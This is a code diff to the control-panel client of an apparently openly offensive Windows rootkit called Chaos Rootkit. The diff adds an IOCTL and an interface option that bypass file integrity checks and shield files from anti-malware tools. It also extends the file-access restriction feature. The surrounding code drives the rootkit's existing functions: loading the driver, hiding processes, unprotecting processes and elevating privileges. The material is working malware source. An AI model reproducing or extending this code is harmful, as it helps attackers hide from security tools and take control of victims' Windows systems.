@@ -104,6 +104,8 @@ Texture	readTextureFile()
 
 #define RESTRICT_ACCESS_TO_FILE_CTL CTL_CODE(FILE_DEVICE_UNKNOWN,0x169,METHOD_BUFFERED ,FILE_ANY_ACCESS)
 
+#define BYPASS_INTEGRITY_FILE_CTL CTL_CODE(FILE_DEVICE_UNKNOWN,0x170,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+
 BOOL loadDriver(char* driverPath) {
     SC_HANDLE hSCM, hService;
 
@@ -178,7 +180,7 @@ BOOL loadDriver(char* driverPath) {
 
 typedef struct foperationx {
     int rpid;
-    char filename[MAX_PATH];
+    wchar_t filename[MAX_PATH] = { 0 };
 }fopera, * Pfoperation;
 
 
@@ -235,13 +237,15 @@ int main(int, char**)
 
 
 
-    char buf[120] = { 0 };
+    char buf[MAX_PATH] = { 0 };
+    char filename[MAX_PATH] = { 0 };
     bool show_demo_window = false;
     bool connect_to_rootkit = false;
     bool elev_specific_process = false;
     bool is_rootket_connected = false;
     bool unprotect_all_processes = false;
     bool restrict_access_to_file = false;
+    bool spoof_file = false;
     bool hide_specific_process = false;
     bool spawn_elevated_process = false;
     HANDLE hdevice = NULL;
@@ -252,6 +256,7 @@ int main(int, char**)
     bool all_windows = false;
     int pid = 0;
     ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);
+    Texture	tex = readTextureFile();
 
 #ifdef __EMSCRIPTEN__
     io.IniFilename = nullptr;
@@ -268,7 +273,6 @@ int main(int, char**)
         ImGui_ImplOpenGL3_NewFrame();
         ImGui_ImplGlfw_NewFrame();
         ImGui::NewFrame();
-        Texture	tex = readTextureFile();
         if (show_demo_window)
             ImGui::ShowDemoWindow(&show_demo_window);
         {
@@ -307,7 +311,7 @@ int main(int, char**)
                     is_rootket_connected = 0;
                 }
 
-                hdevice = CreateFile(L"\\\\.\\KDChaos", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+                hdevice = CreateFileW(L"\\\\.\\KDChaos", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 
                 if (hdevice == INVALID_HANDLE_VALUE)
                 {
@@ -351,6 +355,8 @@ int main(int, char**)
             ImGui::Checkbox("Unprotect All Processes", &unprotect_all_processes);
 
             ImGui::Checkbox("Restrict Access To File", &restrict_access_to_file);
+
+            ImGui::Checkbox("Bypass the file integrity check and protect it against anti-malware", &spoof_file);
 
             ImGui::Text("Application average %.3f ms/frame (%.1f FPS)", 1000.0f / io.Framerate, io.Framerate);
 
@@ -404,7 +410,7 @@ int main(int, char**)
 
             ImGui::SameLine();
 
-            ImGui::InputText(".", buf, IM_ARRAYSIZE(buf));
+            ImGui::InputText("##", buf, IM_ARRAYSIZE(buf));
 
             if (ImGui::Button("Hide Porcess"))
             {
@@ -418,6 +424,9 @@ int main(int, char**)
                 {
                     component_color_handler = 1;
                 }
+
+                printf("return value %d \n", lpBytesReturned);
+
             }
 
             if (component_color_handler == 1)
@@ -480,39 +489,114 @@ int main(int, char**)
 
         if (restrict_access_to_file)
         {
+
+            if (spoof_file == 1)
+            {
+                MessageBoxA(0, "You can only enable either restrict access to files or integrity bypass at a time.", 0, 0);
+                spoof_file = 0;
+            }
             fopera operation_client = { 0 };
             ImGui::Begin("Chaos Rootkit PANEL", &restrict_access_to_file);
-            ImGui::Text("Enter PID"); ImGui::SameLine();
-            ImGui::InputText("##pid", buf, IM_ARRAYSIZE(buf)); // Added label for InputText
-            // ImGui::Text("Enter File Name"); ImGui::SameLine();
-             //ImGui::InputText("##filename", operation_client.filename, IM_ARRAYSIZE(operation_client.filename)); // Added label for InputText
 
-            if (ImGui::Button("restrict access to file X"))
+            ImGui::InputTextWithHint("##", "PID", buf, IM_ARRAYSIZE(buf)); // Added label for InputText
+
+
+            ImGui::InputTextWithHint("###", "Filename", filename, IM_ARRAYSIZE(filename));
+            int i = 0;
+
+            if (ImGui::Button("restrict access to file"))
             {
-                operation_client.rpid = atoi(buf); // Declare pid here
 
-                if (DeviceIoControl(hdevice, RESTRICT_ACCESS_TO_FILE_CTL, (LPVOID)&operation_client, sizeof(operation_client), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
+                if (strlen(filename) || strlen(buf))
                 {
-                    component_color_handler = 2;
+
+                    operation_client.rpid = atoi(buf); // Declare pid here
+
+                    size_t len = mbstowcs(NULL, filename, 0);
+
+                    mbstowcs(operation_client.filename, filename, len + 1);
+
+                    printf("filename to restrict access ( %ls ) \n", operation_client.filename);
+
+                    if (DeviceIoControl(hdevice, RESTRICT_ACCESS_TO_FILE_CTL, (LPVOID)&operation_client, sizeof(operation_client), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
+                        component_color_handler = 2;
+                    else
+                        component_color_handler = 1;
                 }
                 else
                 {
+                    printf("Please make sure to provide filename and a valid pid\n");
                     component_color_handler = 1;
                 }
             }
+
 
             if (component_color_handler == 1)
             {
                 ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
 
-                ImGui::Text("Faild to send IOCTL, Please make sure to provide a valid pid.");
+                ImGui::Text("Faild to send IOCTL, Please make sure to provide a filename and valid pid.");
             }
             if (component_color_handler == 2)
             {
                 ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));
 
                 ImGui::Text("IOCTL sent, File Restricted");
+            }
 
+            if (component_color_handler)
+                ImGui::PopStyleColor();
+            ImGui::End();
+        }
+
+        if (spoof_file)
+        {
+            if (restrict_access_to_file == 1)
+            {
+                MessageBoxA(0, "You can only enable either restrict access to files or integrity bypass at a time.", 0, 0);
+                restrict_access_to_file = 0;
+            }
+            fopera operation_client = { 0 };
+            ImGui::Begin("Chaos Rootkit PANEL", &spoof_file);
+
+            ImGui::InputTextWithHint("###", "Filename", filename, IM_ARRAYSIZE(filename));
+            int i = 0;
+
+            if (ImGui::Button("bypass integrity check"))
+            {
+
+                if (strlen(filename))
+                {
+                    size_t len = mbstowcs(NULL, filename, 0);
+
+                    mbstowcs(operation_client.filename, filename, len + 1);
+
+                    printf("filename to restrict access ( %ls ) \n", operation_client.filename);
+
+                    if (DeviceIoControl(hdevice, BYPASS_INTEGRITY_FILE_CTL, (LPVOID)&operation_client, sizeof(operation_client), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
+                        component_color_handler = 2;
+                    else
+                        component_color_handler = 1;
+                }
+                else
+                {
+                    printf("Please make sure to provide filename\n");
+                    component_color_handler = 1;
+                }
+            }
+
+
+            if (component_color_handler == 1)
+            {
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
+
+                ImGui::Text("Faild to send IOCTL, Please make sure to provide a filename.");
+            }
+            if (component_color_handler == 2)
+            {
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));
+
+                ImGui::Text("IOCTL sent, File Restricted");
             }
 
             if (component_color_handler)
@@ -529,6 +613,7 @@ int main(int, char**)
             {
                 if (DeviceIoControl(hdevice, PRIVILEGE_ELEVATION, (LPVOID)&currentPid, sizeof(currentPid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
                 {
+
                     component_color_handler = 2;
                     if (!lpBytesReturned)
                     {
@@ -541,7 +626,6 @@ int main(int, char**)
                 {
                     component_color_handler = 1;
                 }
-
 
             }
 
